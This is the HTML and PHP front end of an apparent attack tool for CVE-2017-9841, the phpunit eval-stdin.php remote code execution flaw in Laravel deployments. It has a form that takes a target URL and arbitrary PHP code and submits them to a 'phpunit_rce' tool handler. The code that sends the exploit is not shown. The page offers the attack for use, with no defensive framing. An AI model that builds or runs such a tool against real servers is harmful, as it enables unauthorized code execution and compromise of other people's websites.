<html>
<head>
<title>[+] Laravel phpunit RCE [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

option {
  background: #1e1e1e;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

select {
    background: #1e1e1e;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}
</style>
<body><center>
<font face=courier new size=5>Laravel phpunit RCE<br><font size="3">CVE-2017-9841<hr>
<form method="post" action="?tools=phpunit_rce" target="eval">
<font face=courier new>Target : <br></font> <input type="text" name="url" class="area" size="50" height="10" placeholder="https://exploits.my.id/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" style="margin: 5px auto; padding-left: 5px;" value="<?php $meki = $_POST['url']; echo htmlspecialchars($meki);?>" required><br>
<font face=courier new>PHP Code : <br></font><textarea rows=1 name="cmd" placeholder="<?php htmlspecialchars('<?php phpinfo(); ?>')?>" required="true"></textarea><br><br>
<input type="submit" name="go" value="Eksekusi">
</form>
<font><hr>Unknown45 - 2021